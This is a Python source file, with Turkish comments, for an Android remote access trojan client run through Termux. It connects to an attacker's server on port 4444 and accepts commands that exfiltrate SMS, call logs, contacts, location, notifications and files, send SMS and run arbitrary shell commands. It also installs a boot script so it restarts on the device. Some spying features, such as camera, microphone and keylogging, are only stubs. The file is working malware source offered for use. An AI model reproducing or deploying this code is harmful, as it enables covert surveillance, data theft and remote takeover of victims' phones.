# rat_client.py - Android tarafında Termux içinde çalışacak
import socket
import json
import subprocess
import os
import time
import requests
import threading

# Android için modüller
try:
    import androidhelper as android
    ANDROID = True
except:
    ANDROID = False
    print("[!] Android helper not available - running in simulation mode")

class AndroidRATClient:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.socket = None
        self.device_id = self.get_device_id()
        self.running = False
        
    def get_device_id(self):
        # Device ID oluştur
        import uuid
        return str(uuid.uuid4())
    
    def connect_to_server(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.server_ip, self.server_port))
            
            # Device info gönder
            device_info = {
                'device_id': self.device_id,
                'device_name': self.get_device_name(),
                'android_version': self.get_android_version(),
                'ip_address': self.get_ip_address(),
                'connection_time': time.strftime('%Y-%m-%d %H:%M:%S')
            }
            
            self.socket.send(json.dumps(device_info).encode())
            
            print(f"[+] Connected to server {self.server_ip}:{self.server_port}")
            self.running = True
            
            # Komutları dinle
            self.listen_for_commands()
            
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            
    def get_device_name(self):
        if ANDROID:
            droid = android.Android()
            return droid.getDeviceInfo().result.get('product', 'Unknown')
        else:
            return "Simulated Device"
    
    def get_android_version(self):
        if ANDROID:
            droid = android.Android()
            return droid.getDeviceInfo().result.get('version', 'Unknown')
        else:
            return "Simulated Android"
    
    def get_ip_address(self):
        try:
            # WiFi IP'sini al
            if ANDROID:
                droid = android.Android()
                wifi_info = droid.getWifiInfo().result
                return wifi_info.get('ip_address', 'Unknown')
            else:
                return "127.0.0.1"
        except:
            return "Unknown"
    
    def listen_for_commands(self):
        while self.running:
            try:
                data = self.socket.recv(4096).decode()
                if data:
                    command = json.loads(data)
                    cmd = command.get('command')
                    args = command.get('args', [])
                    
                    print(f"[+] Received command: {cmd}")
                    
                    # Komutu çalıştır
                    result = self.execute_command(cmd, args)
                    
                    # Result'ı server'a gönder
                    response = {
                        'type': 'data',
                        'command': cmd,
                        'data': result,
                        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                    }
                    
                    self.socket.send(json.dumps(response).encode())
                    
            except Exception as e:
                print(f"[!] Command receive error: {e}")
                break
    
    def execute_command(self, cmd, args):
        if cmd == "sms_read":
            return self.read_sms()
        elif cmd == "sms_send":
            return self.send_sms(args)
        elif cmd == "call_log":
            return self.get_call_log()
        elif cmd == "contacts":
            return self.get_contacts()
        elif cmd == "location":
            return self.get_location()
        elif cmd == "camera_front":
            return self.capture_camera("front")
        elif cmd == "camera_back":
            return self.capture_camera("back")
        elif cmd == "screen_record":
            return self.screen_record(args)
        elif cmd == "screen_capture":
            return self.screen_capture()
        elif cmd == "file_list":
            return self.list_files(args)
        elif cmd == "file_download":
            return self.download_file(args)
        elif cmd == "file_upload":
            return self.upload_file(args)
        elif cmd == "shell_exec":
            return self.execute_shell(args)
        elif cmd == "app_list":
            return self.list_apps()
        elif cmd == "app_start":
            return self.start_app(args)
        elif cmd == "app_stop":
            return self.stop_app(args)
        elif cmd == "wifi_info":
            return self.get_wifi_info()
        elif cmd == "battery_info":
            return self.get_battery_info()
        elif cmd == "device_info":
            return self.get_device_info()
        elif cmd == "flash_on":
            return self.flash_control("on")
        elif cmd == "flash_off":
            return self.flash_control("off")
        elif cmd == "microphone_record":
            return self.record_microphone(args)
        elif cmd == "notification_read":
            return self.read_notifications()
        elif cmd == "keyboard_log":
            return self.keyboard_logging(args)
        elif cmd == "persistence":
            return self.setup_persistence()
        else:
            return {"error": f"Unknown command: {cmd}"}
    
    def read_sms(self):
        if ANDROID:
            droid = android.Android()
            sms_list = droid.smsGetMessages().result
            return {"sms_count": len(sms_list), "messages": sms_list}
        else:
            return {"sms_count": 0, "messages": []}
    
    def send_sms(self, args):
        if len(args) >= 2:
            number = args[0]
            message = args[1]
            
            if ANDROID:
                droid = android.Android()
                result = droid.smsSend(number, message)
                return {"status": "sent", "number": number, "message": message}
            else:
                return {"status": "simulated", "number": number, "message": message}
        else:
            return {"error": "Need number and message"}
    
    def get_call_log(self):
        if ANDROID:
            droid = android.Android()
            calls = droid.getCallLog().result
            return {"call_count": len(calls), "calls": calls}
        else:
            return {"call_count": 0, "calls": []}
    
    def get_contacts(self):
        if ANDROID:
            droid = android.Android()
            contacts = droid.getContacts().result
            return {"contact_count": len(contacts), "contacts": contacts}
        else:
            return {"contact_count": 0, "contacts": []}
    
    def get_location(self):
        if ANDROID:
            droid = android.Android()
            location = droid.getLastKnownLocation().result
            return {"location": location}
        else:
            return {"location": {"lat": 0, "lon": 0}}
    
    def capture_camera(self, camera_type):
        if ANDROID:
            droid = android.Android()
            # Camera capture simulation
            filename = f"camera_{camera_type}_{time.time()}.jpg"
            return {"status": "captured", "filename": filename, "camera": camera_type}
        else:
            return {"status": "simulated", "filename": "simulated.jpg", "camera": camera_type}
    
    def screen_record(self, args):
        # Screen recording simulation
        action = args[0] if args else "start"
        
        if ANDROID:
            if action == "start":
                # Start recording
                filename = f"screen_record_{time.time()}.mp4"
                return {"status": "recording_started", "filename": filename}
            elif action == "stop":
                return {"status": "recording_stopped"}
        else:
            return {"status": f"{action}_simulated"}
    
    def screen_capture(self):
        if ANDROID:
            # Screen capture simulation
            filename = f"screen_capture_{time.time()}.png"
            
            # Save to gallery path
            gallery_path = "/storage/emulated/0/Pictures/" + filename
            
            return {"status": "captured", "filename": filename, "path": gallery_path}
        else:
            return {"status": "simulated", "filename": "screen.png", "path": "/simulated/path"}
    
    def list_files(self, args):
        path = args[0] if args else "/storage/emulated/0/"
        
        try:
            files = os.listdir(path)
            return {"path": path, "files": files}
        except Exception as e:
            return {"error": str(e)}
    
    def download_file(self, args):
        if args:
            file_path = args[0]
            
            try:
                with open(file_path, 'rb') as f:
                    file_data = f.read()
                
                # Base64 encode for transmission
                import base64
                encoded_data = base64.b64encode(file_data).decode()
                
                return {
                    "type": "file",
                    "file_name": os.path.basename(file_path),
                    "file_data": encoded_data,
                    "size": len(file_data)
                }
            except Exception as e:
                return {"error": str(e)}
        else:
            return {"error": "No file specified"}
    
    def upload_file(self, args):
        # File upload simulation
        if len(args) >= 2:
            filename = args[0]
            data_base64 = args[1]
            
            try:
                import base64
                file_data = base64.b64decode(data_base64)
                
                save_path = "/storage/emulated/0/Downloads/" + filename
                with open(save_path, 'wb') as f:
                    f.write(file_data)
                
                return {"status": "uploaded", "path": save_path}
            except Exception as e:
                return {"error": str(e)}
        else:
            return {"error": "Need filename and data"}
    
    def execute_shell(self, args):
        if args:
            cmd = args[0]
            
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                return {
                    "command": cmd,
                    "output": result.stdout,
                    "error": result.stderr,
                    "return_code": result.returncode
                }
            except Exception as e:
                return {"error": str(e)}
        else:
            return {"error": "No command specified"}
    
    def list_apps(self):
        if ANDROID:
            droid = android.Android()
            apps = droid.getInstalledPackages().result
            return {"app_count": len(apps), "apps": apps}
        else:
            return {"app_count": 0, "apps": []}
    
    def start_app(self, args):
        if args:
            app_package = args[0]
            
            if ANDROID:
                droid = android.Android()
                droid.startActivity(app_package)
                return {"status": "started", "package": app_package}
            else:
                return {"status": "simulated_started", "package": app_package}
        else:
            return {"error": "No app package specified"}
    
    def stop_app(self, args):
        if args:
            app_package = args[0]
            
            if ANDROID:
                droid = android.Android()
                droid.forceStop(app_package)
                return {"status": "stopped", "package": app_package}
            else:
                return {"status": "simulated_stopped", "package": app_package}
        else:
            return {"error": "No app package specified"}
    
    def get_wifi_info(self):
        if ANDROID:
            droid = android.Android()
            wifi_info = droid.getWifiInfo().result
            return {"wifi_info": wifi_info}
        else:
            return {"wifi_info": {"ssid": "Simulated", "ip": "127.0.0.1"}}
    
    def get_battery_info(self):
        if ANDROID:
            droid = android.Android()
            battery = droid.getBatteryInfo().result
            return {"battery_info": battery}
        else:
            return {"battery_info": {"level": 100, "status": "full"}}
    
    def get_device_info(self):
        if ANDROID:
            droid = android.Android()
            device_info = droid.getDeviceInfo().result
            return {"device_info": device_info}
        else:
            return {"device_info": {"model": "Simulated", "version": "Simulated"}}
    
    def flash_control(self, action):
        if ANDROID:
            droid = android.Android()
            
            if action == "on":
                droid.torchOn()
                return {"status": "flash_on"}
            elif action == "off":
                droid.torchOff()
                return {"status": "flash_off"}
        else:
            return {"status": f"flash_{action}_simulated"}
    
    def record_microphone(self, args):
        duration = int(args[0]) if args else 10
        
        if ANDROID:
            # Microphone recording simulation
            filename = f"mic_record_{time.time()}.mp3"
            
            return {
                "status": "recording",
                "filename": filename,
                "duration": duration,
                "path": "/storage/emulated/0/Recordings/" + filename
            }
        else:
            return {"status": "simulated_recording", "duration": duration}
    
    def read_notifications(self):
        if ANDROID:
            droid = android.Android()
            notifications = droid.getNotifications().result
            return {"notification_count": len(notifications), "notifications": notifications}
        else:
            return {"notification_count": 0, "notifications": []}
    
    def keyboard_logging(self, args):
        # Keyboard logging simulation
        duration = int(args[0]) if args else 60
        
        if ANDROID:
            # Start keylogger service
            log_file = f"keylog_{time.time()}.txt"
            
            return {
                "status": "logging_started",
                "log_file": log_file,
                "duration": duration
            }
        else:
            return {"status": "simulated_logging", "duration": duration}
    
    def setup_persistence(self):
        # Persistence simulation - run at boot
        if ANDROID:
            # Create boot script
            boot_script = '''
#!/system/bin/sh
# Auto-start RAT client on boot
sleep 30
cd /data/local/tmp/
python3 rat_client.py --server YOUR_SERVER_IP --port 4444 &
'''
            
            script_path = "/data/local/tmp/rat_boot.sh"
            
            try:
                with open(script_path, 'w') as f:
                    f.write(boot_script)
                
                # Set executable
                os.chmod(script_path, 0o755)
                
                return {
                    "status": "persistence_setup",
                    "script_path": script_path,
                    "message": "RAT will auto-start on boot"
                }
            except Exception as e:
                return {"error": str(e)}
        else:
            return {"status": "simulated_persistence"}
    
    def disconnect(self):
        self.running = False
        if self.socket:
            self.socket.close()

def main():
    print("[+] Android RAT Client Starting...")
    
    # Server IP ve port al
    server_ip = input("Server IP: ")
    server_port = int(input("Server Port (default 4444): ") or 4444)
    
    client = AndroidRATClient(server_ip, server_port)
    client.connect_to_server()

if __name__ == "__main__":
    main()
